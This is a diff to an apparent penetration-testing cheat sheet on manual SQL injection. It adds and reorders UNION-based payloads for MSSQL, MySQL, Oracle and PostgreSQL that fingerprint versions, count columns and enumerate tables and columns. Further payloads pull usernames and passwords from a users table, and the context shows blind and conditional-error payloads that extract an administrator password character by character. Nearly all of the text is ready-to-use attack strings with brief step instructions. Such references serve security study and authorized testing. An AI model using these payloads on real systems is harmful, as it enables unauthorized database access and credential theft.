@@ -80,7 +80,7 @@ render_with_liquid: true
 
 ## Manual Injection
 
-1. **Comments**
+- **Comments**
 
     ```
     MSSQL       ->  --
@@ -89,17 +89,120 @@ render_with_liquid: true
     PostreSQL   ->  --
     ```
 
-2. **Basic Syntax**
+- **Versions**
+
+    - **MSSQL**
+
+        ```
+        ' UNION SELECT @@version--
+        ' UNION SELECT NULL,@@version--
+        ```
+
+    - **MySQL**
+
+        ```
+        ' UNION SELECT @@version--
+        ' UNION SELECT @@version#
+        ' UNION SELECT NULL,@@version--
+        ' UNION SELECT NULL,@@version#
+        ```
+
+    - **Oracle**
+
+        ```
+        ' UNION SELECT 'a' FROM dual--
+        ' UNION SELECT 'a','b' FROM dual--
+        ' UNION SELECT * FROM v$version--
+        ' UNION SELECT BANNER,NULL FROM v$version--
+        ```
+
+    - **PostgreSQL**
+
+        ```
+        ' UNION SELECT version()--
+        ```
+
+- **Basic Syntax**
+
+    First off, check if you can insert the SQL commands.
 
     ```
     ' OR 1=1--
     ' OR 1=1#
+    ```
+
+    If you know you can do that, find the number of the columns in the database.
+
+    ```
     ' UNION SELECT NULL#
     ' UNION SELECT NULL,NULL#
     ' UNION SELECT NULL,NULL,NULL#
     ' UNION SELECT 'a',NULL,NULL#
     ' UNION SELECT NULL,'a',NULL#
     ' UNION SELECT NULL,NULL,'a'#
+    ```
+
+    Get the table name in which you want to get the information.
+
+    - **MSSQL**
+
+        ```
+        ' UNION SELECT table_name,NULL FROM information_schema.tables--
+        ```
+
+    - **MySQL**
+
+        ```
+        ' UNION SELECT table_name,NULL FROM information_schema.tables--
+        ' UNION SELECT table_name,NULL FROM information_schema.tables#
+
+        ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--
+        ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables#
+        ```
+
+    - **PostgreSQL**
+
+        ```
+        ' UNION SELECT table_name,NULL FROM information_schema.tables--
+        ```
+
+    - **Oracle**
+
+        ```
+        ' UNION SELECT table_name,NULL FROM all_tables--
+        ```
+
+    Get the column name from the table name you got.
+
+    - **MSSQL**
+
+        ```
+        ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
+        ```
+
+    - **MySQL**
+
+        ```
+        ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
+        ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'#
+        ```
+
+    - **PostgreSQL**
+
+        ```
+        ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
+        ```
+
+    - **Oracle**
+
+        ```
+        ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'--
+        ```
+
+    Get the desired information in the database.  
+    For instance, suppose you want to get the username and password from the table named 'users'.
+
+    ```
     ' UNION SELECT username,password FROM users#
     ' UNION SELECT username || '~' || password FROM users#
     ' UNION SELECT NULL,username || '~' || password FROM users#
@@ -114,55 +217,7 @@ render_with_liquid: true
     ' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'#
     ```
 
-    - **Version**
-
-        - **MSSQL, MySQL**
-
-            ```
-            ' UNION SELECT @@version--
-            ' UNION SELECT @@version#
-            ' UNION SELECT NULL,@@version--
-            ' UNION SELECT NULL,@@version#
-            ```
-
-        - **Oracle**
-
-            ```
-            ' UNION SELECT 'a' FROM dual--
-            ' UNION SELECT 'a','b' FROM dual--
-            ' UNION SELECT * FROM v$version--
-            ' UNION SELECT BANNER,NULL FROM v$version--
-            ```
-
-        - **PostgreSQL**
-
-            ```
-            ' UNION SELECT version()--
-            ```
-
-    - **Contents**
-
-        1. **Get Table Name**
-
-            ```
-            ' UNION SELECT table_name,NULL FROM information_schema.tables--
-            ' UNION SELECT table_name,NULL FROM all_tables--
-            ```
-
-        2. **Column Name**
-
-            ```
-            ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
-            ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
-            ```
-
-        3. **Values in Column**
-
-            ```
-            ' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
-            ```
-
-3. **Blind SQL**
+- **Blind SQL**
 
     1. **First Check**
 
@@ -198,7 +253,7 @@ render_with_liquid: true
         ' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$
         ```
 
-4. **Conditional Error**
+- **Conditional Error**
 
     1. **First Check**
 
@@ -237,7 +292,7 @@ render_with_liquid: true
         '||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
         ```
 
-5. **Time Delay**
+- **Time Delay**
 
     1. **First Check**
 
